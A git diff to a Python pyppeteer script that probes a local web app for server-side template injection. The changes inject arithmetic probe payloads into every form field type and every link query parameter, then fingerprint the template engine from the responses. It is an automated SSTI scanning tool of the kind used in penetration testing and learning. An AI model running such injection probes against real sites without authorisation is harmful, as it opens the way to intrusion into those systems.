@@ -110,15 +110,41 @@ def create_payload(symbols):
     return payload, operation
 
 
-async def exec_payload(form, payload):
+async def exec_payload(page, form, payload):
     # find the input text areas
-    input_txt_lst = await form.querySelectorAll("input[type=\"text\"]")
+    input_type_lst = await form.querySelectorAll('input[type]:not([type="reset"])'
+                                                 ':not([type="submit"])'
+                                                 ':not([type="button"])'
+                                                 ':not([type="image"])')
+    input_type_lst += await form.querySelectorAll('textarea')
+
+    #input_txt_lst = await form.querySelectorAll("input[type=\"text\"]")
     # write the payload inside every input text area of the form
-    for input_txt in input_txt_lst:
-        await input_txt.type(payload)
+    for input_element in input_type_lst:
+        element_type = await page.evaluate('(el) => el.type', input_element)
+
+        if element_type in ["text", "password", "search", "tel", "url", "textarea"]:
+            # mimick user typing: the text may be altered by a client-side validation mechanism
+            await input_element.type(payload)
+
+        #NOTE: consider select-option, hidden as well...
+        elif element_type in ["radio", "checkbox", "hidden"]:
+            await page.evaluate("(el, value) => el.value = value", input_element, payload)
+            if element_type in ["radio", "checkbox"]:
+                await input_element.click()
+
+        # PROBLEM: some characters like @ and () are not allowed for emails!
+        elif element_type in ["email"]:
+            await input_element.type(payload+"@a")
+            # check email validity
+            if not await page.evaluate("(el) => el.validity.valid", input_element):
+                # if invalid, change it with a valid one and leave it
+                print("The email is invalid.")
+                await page.evaluate("(el, value) => el.value = value", input_element, "a@a")
     # find the button element and click
     btn = await form.querySelector("input[type='submit'], button[type='submit']")
     await btn.click()
+
 
 
 async def inject_payload(page, url, payload):
@@ -126,20 +152,51 @@ async def inject_payload(page, url, payload):
     # search for all the existing forms in the page first
     forms_lst = await page.querySelectorAll("form")
     html_resp = ""
+
     for form_idx in range(len(forms_lst)):
         curr_form = forms_lst[form_idx]
         try:
-            await exec_payload(curr_form, payload)
+            await exec_payload(page, curr_form, payload)
             # be careful for real web sites: check if the context changes
-            await page.waitForNavigation()
+            await page.waitForNavigation({'waitUntil': 'domcontentloaded'})
             html_resp += await page.content()
             # go back to previous page and look for other forms
-            await page.goBack()
+            # lately it takes too much time waiting for some resources
+            #await page.goBack()
+            await page.goto(url)
+
             # refresh element references (with button click they are lost)
             forms_lst = await page.querySelectorAll("form")
         except Exception as e:
             print(e)
+
+    links_lst = await page.querySelectorAll("a")
+    for link_idx in range(len(links_lst)):
+        link_elem = links_lst[link_idx]
+        href = await page.evaluate("(el) => el.href", link_elem)
+        # discard links without query parameters
+        if "?" not in href:
+            continue
+
+        href, query_params = tuple(href.split("?"))
+        query_params = query_params.split("&")
+        new_queries = "?"
+        for key_value in query_params:
+            key = key_value.split("=")[0]
+            new_queries += f"{key}={payload}&"
+
+        new_href = href + new_queries[:-1]  # delete last "&"
+        await page.evaluate("(el, new_value) => el.href=new_value", link_elem, new_href)
+        await link_elem.click()
+
+        await page.waitForNavigation({'waitUntil': 'domcontentloaded'})
+        html_resp += await page.content()
+        await page.goto(url)
+        links_lst = await page.querySelectorAll("a")
+
+
     return html_resp
+
 
 
 def check_te_in_response(response, eng_lang_dct):
@@ -215,8 +272,15 @@ def find_template_engines(success_symbols):
                 possible_engines[eng] = {"symbols": engines_by_symbols[eng]["symbols"],
                                      "language": engines_by_symbols[eng]["language"]}
         return simple_dict, possible_engines,
-
     return simple_dict, target_engines
+
+
+def show_engines(simple_dict, te_dct):
+    if simple_dict:
+        [print(f"--> {te} ({lang})") for te, lang in te_dct.items()]
+    else:
+        [print(f"--> {te} ({symb_lang['language']}), for symbols {list(symb_lang['symbols'])})")
+         for te, symb_lang in te_dct.items()]
 
 
 async def ssti_attack(success_symbols_lst, success_payloads_lst, symbols, page, url):
@@ -225,7 +289,7 @@ async def ssti_attack(success_symbols_lst, success_payloads_lst, symbols, page, 
     print(f"\nTrying symbols '{symbols}' with payload '{payload}'...")
 
     response = await inject_payload(page, url, payload)
-    print(response)
+    #print(response)
 
     result = str(eval(operation))
     success, resp_matches = validate_injection(result, response)
@@ -240,6 +304,7 @@ async def ssti_attack(success_symbols_lst, success_payloads_lst, symbols, page, 
         print("Failed injection.")
 
     return response
+
 
 async def main():
     url = "http://127.0.0.1:8080"
@@ -259,54 +324,14 @@ async def main():
 
     for symbols in te_symbols:
         response = await ssti_attack(success_symbols_lst, success_payloads_lst, symbols, page, url)
-
-
-        """
-        curr_symbols = symbols
-        payload, operation = create_payload(curr_symbols)
-        print(f"\nTrying symbols '{curr_symbols}' with payload '{payload}'...")
-
-        response = await inject_payload(page, url, payload)
-
-        result = str(eval(operation))
-        success, resp_matches = validate_injection(result, response)
-        if success:
-            # check if current symbols have to be added or not
-            store_symbols(success_symbols_lst, success_payloads_lst, curr_symbols, payload)
-
-            print("Successful injection!")
-            for match in resp_matches:
-                print(match)
-        else:
-            print("Failed injection.")
-        
-        """
-
         eng_name = check_te_in_response(response, engines_dct)
         if eng_name != "":
             print(f"\nTemplate engine '{eng_name}' found in the response! ")
             # retrieve the symbols recognized by the engine
             eng_symbols = load_symbols_by_engine(eng_name)
             for tags in eng_symbols:
-                await ssti_attack(success_symbols_lst, success_payloads_lst, tags, page, url)
-            """
-            for curr_tags in eng_symbols:
-                payload, operation = create_payload(curr_tags)
-                print(f"\nTrying symbols '{curr_tags}' with payload '{payload}'...")
-
-                response = await inject_payload(page, url, payload)
-                result = str(eval(operation))
-                success, resp_matches = validate_injection(result, response)
-                if success:
-                    # check if current symbols have to be added or not
-                    store_symbols(success_symbols_lst, success_payloads_lst, curr_tags, payload)
-
-                    print("Successful injection!")
-                    for match in resp_matches:
-                        print(match)
-                else:
-                    print("Failed injection.")
-            """
+                if tags not in success_symbols_lst:
+                    await ssti_attack(success_symbols_lst, success_payloads_lst, tags, page, url)
             break
 
     await browser.close()
@@ -318,14 +343,12 @@ async def main():
         print("\nSome successful payloads have been found:\n", success_payloads_lst)
         print(f"Target template engine(s): ")
         simple_dict, te_dct = find_template_engines(success_symbols_lst)
-        if simple_dict:
-            [print(f"--> {te} ({lang})") for te, lang in te_dct.items()]
-        else:
-            [print(f"--> {te} ({symb_lang['language']}), for symbols {list(symb_lang['symbols'])})")
-                for te, symb_lang in te_dct.items()]
+        show_engines(simple_dict, te_dct)
+
 
     else:
         print("No successful payload has been found.")
+
 
 
 if __name__ == "__main__":
